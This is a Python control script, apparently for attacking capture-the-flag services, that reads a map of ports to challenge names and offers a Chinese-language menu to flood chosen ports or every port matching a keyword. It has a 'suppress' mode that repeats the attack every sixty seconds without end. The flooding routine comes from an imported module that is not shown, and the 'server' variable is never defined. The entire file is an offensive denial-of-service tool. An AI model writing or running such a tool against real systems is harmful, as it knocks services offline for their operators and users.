from ddos import *
from fastsearch import *
context(arch='amd64', log_level='debug', os='linux')

def refresh():
    searcher()
    f = open("ports.json", "r+")
    ports = json.load(f)
    f.close()

try:
    f = open("ports.json", "r+")
    ports = json.load(f)
    f.close()
except:
    refresh()
    pass

with open("ddos日志.txt", 'a+') as f:
    time_data1 = datetime.datetime.now().strftime("%y/%m/%d/%H:%M")
    f.write(time_data1 + "\n\n")
f.close()

while 1:
    choice = input("[1]显示所有目标\n[2]ddos指定题目\n[3]ddos指定端口\n[4]刷新\n[5]压制题目\n")
    if choice == '1':
        print(ports)
    if choice == '2':
        keyword = input("输入目标关键词")
        for port in ports:
            if keyword in ports[port]:
                ddos(server,port)
            else:
                continue
    if choice == '3':
        port = input("输入目标端口")
        ddos(server,port)
    if choice == '4':
        refresh()
    if choice == '5':
        keyword = input("输入目标关键词")
        for port in ports:
            if keyword in ports[port]:
                ddos(server, port)
            else:
                continue
        while 1:
            refresh()
            for port in ports:
                if keyword in ports[port]:
                    ddos(server, port)
                else:
                    continue
            sleep(60)
